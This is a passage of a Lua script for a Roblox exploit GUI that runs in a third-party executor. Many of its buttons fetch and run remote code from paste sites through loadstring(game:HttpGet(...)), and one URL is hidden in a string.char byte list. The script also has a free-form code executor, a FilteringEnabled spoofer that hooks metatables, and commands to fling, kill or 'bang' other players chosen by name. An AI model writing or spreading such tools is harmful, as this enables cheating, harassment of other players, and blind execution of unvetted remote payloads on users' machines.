            print("[FE Spoofer] setHiddenProperty succeeded (workspace.FilteringEnabled set locally to false).")
        else
            print("[FE Spoofer] setHiddenProperty failed or unavailable: "..tostring(msg))
        end

        -- Hook metatable so local scripts reading workspace.FilteringEnabled see false
        local hooked, err = safe_hook_metatable()
        if hooked then
            print("[FE Spoofer] Metatable hooked — local reads of Workspace.FilteringEnabled will return false.")
        else
            warn("[FE Spoofer] Metatable hook failed: "..tostring(err))
        end

        applied = true
        -- Inform user
        warn("[FE Spoofer] Spoof applied locally. NOTE: This does NOT change server enforcement. Server-side checks remain authoritative.")
    end

    local function removeSpoof()
        if not applied then
            warn("[FE Spoofer] Not applied")
            return
        end

        -- Attempt to restore metatable
        safe_unhook_metatable()

        -- Can't reliably undo setHiddenProperty in all executors; attempt if available
        pcall(function()
            if setHiddenProperty then
                setHiddenProperty(Workspace, "FilteringEnabled", Workspace.FilteringEnabled)
            elseif sethiddenproperty then
                sethiddenproperty(Workspace, "FilteringEnabled", Workspace.FilteringEnabled)
            end
        end)

        applied = false
        print("[FE Spoofer] Removed local spoof (best-effort). Server still authoritative.")
    end

    -- Toggle UI-less: call applySpoof() to enable, removeSpoof() to disable.
    -- For NasGUI button behavior, toggle on first click, disable on second click:
    if not applied then
        applySpoof()
    else
        removeSpoof()
    end
end},
{"JanDestroy GUI", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/uJ0P9mfE"))()
end},
{"c00lgui Reborn v0.5", function()
     loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
end},
{"Anti-Ragdoll & Fling", function()
     loadstring(game:HttpGet("https://pastefy.app/UiCdR9IH/raw"))()
end},
{"Infinite Yield", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end},
{"JanGUI [NEW]", function()
-- Made by JAN
    loadstring(game:HttpGet("https://pastefy.app/pviNRilX/raw"))()
end},
{"FE Forsaken", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Forsakination-48596"))()
end},
{"T0PK3K 5.0", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/nosyliam/3a0464974205a93d31b9f188ace47a53/raw/983b37288a04ce048b9a8cde36fefa0b7564691a/tksrc.lua"))()
end},
{"J44sGUI by Jan & Nas", function()
    loadstring(game:HttpGet("https://pastefy.app/zhHfBbeA/raw"))()
end},
{"Audio Logger", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Roblox-Audio-Logger-1522"))()
end},
{"FE TikTok Emotes 2024", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Roblox-Tiktok-Emotes-Script-2024-R15-Only-49032"))()
end},
{"Brookhaven c00lkidd Skybox", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-skybox-c00lkidd-59724"))()
end},
{"Secret Service Panel", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Secret-Service-panel-9623"))()
end},
{"Wait They Don't Love You Dance", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Wait-They-Dont-Love-You-Like-I-Love-You-Animation-Dance-24631"))()
end}
}


for i, item in ipairs(buttons) do
    createButton(scrollMain, item[1], (i-1)*50, item[2])
end
scrollMain.CanvasSize = UDim2.new(0, 0, 0, #buttons * 50)


-- Executor Tab Content
local inputBox = Instance.new("TextBox", containerExec)
inputBox.Size = UDim2.new(1, 0, 0.7, 0)
inputBox.Position = UDim2.new(0, 0, 0, 0)
inputBox.Text = "-- Script goes here."
inputBox.MultiLine = true
inputBox.TextXAlignment = Enum.TextXAlignment.Left
inputBox.TextYAlignment = Enum.TextYAlignment.Top
inputBox.ClearTextOnFocus = false
inputBox.Font = Enum.Font.Code
inputBox.TextSize = 14
inputBox.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
inputBox.TextWrapped = true
inputBox.ZIndex = 1


local execButton = Instance.new("TextButton", containerExec)
execButton.Size = UDim2.new(1, 0, 0, 40)
execButton.Position = UDim2.new(0, 0, 0.72, 10)
execButton.Text = "EXECUTE"
execButton.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
execButton.TextColor3 = Color3.fromRGB(255, 255, 255)
execButton.Font = Enum.Font.GothamBold
execButton.TextSize = 16
execButton.ZIndex = 1
execButton.MouseButton1Click:Connect(function()
    pcall(function()
        loadstring(inputBox.Text)()
    end)
end)


-- Misc Tab Content (continued from playerInput)
local playerInput = Instance.new("TextBox", containerMisc)
playerInput.Size = UDim2.new(1, -20, 0, 30)
playerInput.Position = UDim2.new(0, 10, 0, 0)
playerInput.PlaceholderText = "Enter Player Name"
playerInput.Text = ""
playerInput.Font = Enum.Font.Gotham
playerInput.TextSize = 14
playerInput.TextColor3 = Color3.fromRGB(255, 255, 255)
playerInput.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
playerInput.BorderColor3 = Color3.fromRGB(255, 50, 50)
playerInput.ZIndex = 1


-- ScrollingFrame for Misc Tab
local scrollMisc = Instance.new("ScrollingFrame", containerMisc)
scrollMisc.Size = UDim2.new(1, 0, 1, -40) -- Adjusted for playerInput
scrollMisc.Position = UDim2.new(0, 0, 0, 40)
scrollMisc.BackgroundTransparency = 1
scrollMisc.ScrollBarThickness = 5
scrollMisc.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 50)
scrollMisc.CanvasSize = UDim2.new(0, 0, 0, 0) -- Auto-adjusted later
scrollMisc.ZIndex = 1


local miscLayout = Instance.new("UIListLayout", scrollMisc)
miscLayout.Padding = UDim.new(0, 10)
miscLayout.SortOrder = Enum.SortOrder.LayoutOrder


-- Helper to find player by partial name
local function findPlayer(name)
    for _, p in pairs(game.Players:GetPlayers()) do
        if p.Name:lower():sub(1, #name) == name:lower() then
            return p
        end
    end
end


-- Misc Tab Buttons Helper
local function createMiscButton(yPos, text, callback)
    local button = Instance.new("TextButton", scrollMisc)
    button.Size = UDim2.new(1, -20, 0, 30)
    button.Position = UDim2.new(0, 10, 0, yPos)
    button.Text = text
    button.Font = Enum.Font.GothamBold
    button.TextSize = 14
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
    button.BorderColor3 = Color3.fromRGB(255, 50, 50)
    button.ZIndex = 1
    button.MouseButton1Click:Connect(callback)
    return button
end


-- Stat Controls Helper
local function createMiscEntry(yPos, placeholderText, buttonText, callback)
    local textBox = Instance.new("TextBox", scrollMisc)
    textBox.Size = UDim2.new(0, 200, 0, 30)
    textBox.Position = UDim2.new(0, 10, 0, yPos)
    textBox.PlaceholderText = placeholderText
    textBox.Text = ""
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 14
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
    textBox.BorderColor3 = Color3.fromRGB(255, 50, 50)
    textBox.ZIndex = 1


    local button = Instance.new("TextButton", scrollMisc)
    button.Size = UDim2.new(0, 160, 0, 30)
    button.Position = UDim2.new(0, 220, 0, yPos)
    button.Text = buttonText
    button.Font = Enum.Font.GothamBold
    button.TextSize = 14
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
    button.BorderColor3 = Color3.fromRGB(255, 50, 50)
    button.ZIndex = 1


    button.MouseButton1Click:Connect(function()
        local val = tonumber(textBox.Text)
        if val then callback(val) end
    end)
end


-- Player Commands
local yPos = 0

-- Bang Player
createMiscEntry(yPos, "Player Name", "Bang Player", function(targetName)
    local target = findPlayer(targetName)
    if target then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        task.wait(1)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(";bang "..target.Name.." 5", "All")
    else
        warn("Player not found")
    end
end)
yPos += 40

-- Fling Player
createMiscEntry(yPos, "Player Name", "Fling Player", function(targetName)
    local target = findPlayer(targetName)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = target.Character.HumanoidRootPart
        local body = Instance.new("BodyVelocity", hrp)
        body.Velocity = Vector3.new(9999, 9999, 9999)
        body.MaxForce = Vector3.new(1e9, 1e9, 1e9)
        game.Debris:AddItem(body, 0.2)
    else
        warn("Player not found or missing HumanoidRootPart")
    end
end)
yPos += 40

-- Teleport to Player
createMiscEntry(yPos, "Player Name", "Teleport to Player", function(targetName)
    local target = findPlayer(targetName)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)
    else
        warn("Player not found or missing HumanoidRootPart")
    end
end)
yPos += 40

-- WalkSpeed
createMiscEntry(yPos, "WalkSpeed amount", "Set Speed", function(val)
    LocalPlayer.Character.Humanoid.WalkSpeed = val
end)
yPos += 40

-- JumpPower
createMiscEntry(yPos, "JumpPower amount", "Set Jumppower", function(val)
    LocalPlayer.Character.Humanoid.JumpPower = val
end)
yPos += 40

-- Gravity
createMiscEntry(yPos, "Gravity amount", "Set Gravity", function(val)
    game.Workspace.Gravity = val
end)
yPos += 40

-- Kill Player
createMiscEntry(yPos, "Player Name", "Kill Player", function(targetName)
    local target = findPlayer(targetName)
    if target and target.Character and target.Character:FindFirstChild("Humanoid") then
        target.Character.Humanoid.Health = 0
    else
        warn("Player not found or missing Humanoid")
    end
end)
yPos += 40

-- Grab Knife
createMiscButton(yPos, "Grab Knife V4", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-Knife-V4-56561"))()
end)
yPos += 40

-- NasGUI V1.0
createMiscButton(yPos, "[Ancient] NasGUI V1.0", function()
    loadstring(game:HttpGet("https://pastefy.app/P7a8Lj5Y/raw"))()
end)
yPos += 40

-- NasGUI V1.6
createMiscButton(yPos, "NasGUI V1.6 Reborn", function()
    -- The new era of NasGUI is out! Meet the new NASGUI V1.6 REBORN!
-- Scripted, revamped by nas9229alt!


local u = string.char(
104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,111,79,71,76,73,85,90,69,47,114,97,119
)

-- Wrap in loadstring to execute
loadstring(game:HttpGet(u))()
end)
yPos += 40

-- Anti-AFK
createMiscButton(yPos, "Anti-AFK", function()
    local VirtualUser = game:GetService("VirtualUser")
    game:GetService("Players").LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end)
yPos += 40

-- nasgui v1.7.6
createMiscButton(yPos, "NasGUI Reborn V1.7.6", function()
    -- OMG! Newer NasGUI, and it is official; NASGUI V1.7.6 REBORN!!!
-- Made by nas9229alt

loadstring(game:HttpGet("https://pastefy.app/PSwknTJR/raw?part=NasGUI-v1.7.6_REBORN.lua"))()
end)
yPos += 40

-- Clone Yourself
createMiscButton(yPos, "Clone Yourself", function()
    local plr = LocalPlayer
    if plr and plr.Character then
        local clone = plr.Character:Clone()
        clone.Parent = workspace
        clone:SetPrimaryPartCFrame(plr.Character:GetPrimaryPartCFrame() + Vector3.new(3,0,0))
    end
end)
yPos += 40

-- vooed
createMiscButton(yPos, "Void Disabler", function()
local VOID_HEIGHT = -math.huge  -- effectively disables void kill
local CHECK_INTERVAL = 0.2

game:GetService("RunService").Heartbeat:Connect(function()
	for _, player in ipairs(game.Players:GetPlayers()) do
		local char = player.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		local humanoid = char and char:FindFirstChildOfClass("Humanoid")

		if root and humanoid then
			-- The check will basically never trigger now
			if root.Position.Y < VOID_HEIGHT then
				-- fallback teleport (won't ever happen realistically)
				root.Velocity = Vector3.zero
				root.CFrame = CFrame.new(root.Position.X, 10, root.Position.Z)
			end
		end
	end
end)
end)
yPos += 40

-- walk on wallz
createMiscButton(yPos, "Walk On Walls", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/FE-walk-on-walls_206"))()
end)
yPos += 40

-- CAMERA EEEE
createMiscButton(yPos, "Security Cameras", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FNAF-Inspired-Camera-Script-17367"))()
end)
yPos += 40

-- Local
createMiscButton(yPos, "RC7", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rc7-29631"))()
end)
yPos += 40

-- Fly
createMiscButton(yPos, "Fly GUI v3", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-Gui-V3-Turkish-48460"))()
end)
yPos += 40

-- Auto-resize Misc ScrollingFrame
miscLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    scrollMisc.CanvasSize = UDim2.new(0, 0, 0, miscLayout.AbsoluteContentSize.Y)
end)
